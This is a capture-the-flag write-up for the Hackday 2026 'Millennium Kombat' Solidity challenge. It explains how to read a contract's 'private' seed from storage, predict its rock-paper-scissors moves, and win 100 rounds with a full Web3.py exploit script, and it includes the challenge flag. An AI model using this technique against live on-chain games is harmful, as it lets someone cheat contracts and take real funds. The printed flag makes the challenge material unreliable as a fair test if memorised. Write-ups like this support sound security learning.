# Millennium Kombat

## Challenge Information
- **Name:** Millennium Kombat
- **Category:** Blockchain / Smart Contract
- **Event:** Hackday 2026
- **Status:** SOLVED

## Flag
```
HACKDAY{6954de044483cfd38491854328f846d6ac76005b8e1e459aa68dd4c443ceae14}
```

## Description

A blockchain challenge featuring a Rock-Paper-Scissors style combat game implemented as a Solidity smart contract. Players must win 100 consecutive rounds against the contract to solve the challenge.

## Vulnerability Analysis

### The Flawed RNG

The contract uses a deterministic pseudo-random number generator for the opponent's moves:

```solidity
// Opponent's move selection (simplified)
uint256 private seed;

function getOpponentMove() internal returns (uint256) {
    uint256 chosenMove = seed % 3;
    seed += uint160(address(this));
    return chosenMove;
}
```

### Key Weaknesses

1. **Predictable Seed**: The `seed` variable, despite being marked `private`, is stored on-chain and can be read using `eth_getStorageAt`

2. **Deterministic Updates**: The seed increment is based on the contract's address, which is known and constant

3. **No External Entropy**: The RNG doesn't use block hashes, timestamps, or other harder-to-predict values

### Storage Layout

In Solidity, storage variables are laid out sequentially:
- Slot 0: (other contract state)
- **Slot 1**: `seed` variable

## Exploit Strategy

### Step 1: Setup

Launch the challenge instance and collect:
- RPC endpoint URL
- Private key for transactions
- Setup contract address
- Kombat contract address (the challenge)

### Step 2: Read the Seed

Use `eth_getStorageAt` to read the private seed:

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider(rpc_url))
kombat_address = "0x..."

# Read slot 1 (seed storage location)
seed = int(w3.eth.get_storage_at(kombat_address, 1).hex(), 16)
```

### Step 3: Predict Opponent Moves

The game uses Rock-Paper-Scissors logic:
- 0 = Rock
- 1 = Paper
- 2 = Scissors

Counter-move chart:
| Opponent | Winning Move |
|----------|--------------|
| 0 (Rock) | 1 (Paper) |
| 1 (Paper) | 2 (Scissors) |
| 2 (Scissors) | 0 (Rock) |

Formula: `winning_move = (opponent_move + 1) % 3`

### Step 4: Execute 100 Winning Rounds

```python
kombat_address_int = int(kombat_address, 16)

for round in range(100):
    # Predict opponent's move
    opponent_move = seed % 3

    # Calculate winning counter-move
    player_move = (opponent_move + 1) % 3

    # Update seed for next prediction
    seed += kombat_address_int

    # Send transaction
    tx = kombat_contract.functions.fight(player_move).build_transaction({
        'from': player_address,
        'nonce': w3.eth.get_transaction_count(player_address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })

    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    w3.eth.wait_for_transaction_receipt(tx_hash)
```

### Step 5: Verify and Get Flag

```python
# Check if solved
is_solved = setup_contract.functions.isSolved().call()
print(f"Solved: {is_solved}")

# Request flag from challenge platform using instance UUID
```

## Full Exploit Script

```python
#!/usr/bin/env python3
from web3 import Web3
import json

# Challenge parameters
RPC_URL = "http://..."
PRIVATE_KEY = "0x..."
KOMBAT_ADDRESS = "0x..."
SETUP_ADDRESS = "0x..."

# Connect
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)

# Read initial seed from storage slot 1
seed = int(w3.eth.get_storage_at(KOMBAT_ADDRESS, 1).hex(), 16)
print(f"Initial seed: {seed}")

kombat_address_int = int(KOMBAT_ADDRESS, 16)

# Kombat contract ABI (minimal)
KOMBAT_ABI = [{"inputs":[{"type":"uint256"}],"name":"fight","outputs":[],"type":"function"}]
kombat = w3.eth.contract(address=KOMBAT_ADDRESS, abi=KOMBAT_ABI)

# Win 100 rounds
for i in range(100):
    opponent = seed % 3
    player = (opponent + 1) % 3
    seed += kombat_address_int

    tx = kombat.functions.fight(player).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': 100000,
        'gasPrice': w3.eth.gas_price
    })

    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    print(f"Round {i+1}/100: opponent={opponent}, player={player}, tx={tx_hash.hex()[:16]}...")

print("Done! Check isSolved() and request flag.")
```

## Key Takeaways

1. **Private != Secret**: Solidity's `private` keyword only prevents other contracts from reading the variable directly. All on-chain data is publicly readable via `eth_getStorageAt`.

2. **On-chain Randomness is Hard**: Smart contracts cannot generate truly random numbers. Common vulnerable patterns include:
   - Using block variables (predictable by miners)
   - Using contract state (readable from storage)
   - Deterministic seed updates

3. **Storage Slot Calculation**: Understanding Solidity's storage layout is essential for blockchain CTF challenges. Simple variables are stored sequentially starting at slot 0.

4. **Commit-Reveal for Fairness**: For fair on-chain games, use commit-reveal schemes or external randomness oracles (like Chainlink VRF).

## Tools Used

- **Web3.py** - Ethereum interaction library
- **eth_getStorageAt** - Reading contract storage directly
- **Python** - Exploit scripting

## References

- [Solidity Storage Layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
- [SWC-120: Weak Sources of Randomness](https://swcregistry.io/docs/SWC-120)
- [Predicting Random Numbers in Ethereum Smart Contracts](https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620)
